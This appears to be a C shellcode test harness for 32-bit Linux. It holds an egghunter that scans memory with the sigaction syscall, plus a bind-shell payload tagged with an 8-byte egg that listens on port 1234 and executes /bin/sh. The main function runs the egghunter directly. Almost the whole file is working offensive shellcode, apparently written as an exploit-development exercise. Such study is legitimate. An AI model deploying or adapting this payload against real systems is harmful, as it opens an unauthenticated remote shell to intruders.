#include <stdio.h>
#include <string.h>

#define EGG "\x37\x3F\x37\x3F"



unsigned char egghunter[] = \
""
"\xfc"                  // clear direction flag in preparation for scasd 
"\x31\xd2"              // clear edx
"\x31\xc9"              // clear ecx
"\x66\x81\xc9\xff\x0f"  // or     cx,0xfff
"\x41"                  // inc    ecx
"\x6a\x43"              // push   0x43
"\x58"                  // pop    eax
"\xcd\x80"              // int    0x80
"\x3c\xf2"              // cmp    al,0xf2
"\x74\xf1"              // je     align_page
"\xb8" 
EGG                     // mov    eax,0x373F373F
"\x89\xcf"              // mov    edi,ecx
"\xaf"                  // scas   eax,DWORD PTR es:[edi]
"\x75\xec"              // jne    next_address
"\xaf"                  // scas   eax,DWORD PTR es:[edi]
"\x75\xe9"              // jne    next_address
"\xff\xe7";             // jmp    edi

unsigned char code[] = \
EGG
EGG // local bind shellcode to port 1234
"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89"
"\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x04\xd2\x66\x53\x89\xe1"
"\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd"
"\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0"
"\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x41\x89\xca\x89\xe3\xcd\x80";

int main(void) {
    printf("Shellcode length + 8 byte egg: %d\n", strlen(code));
    printf("Egg hunter length: %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
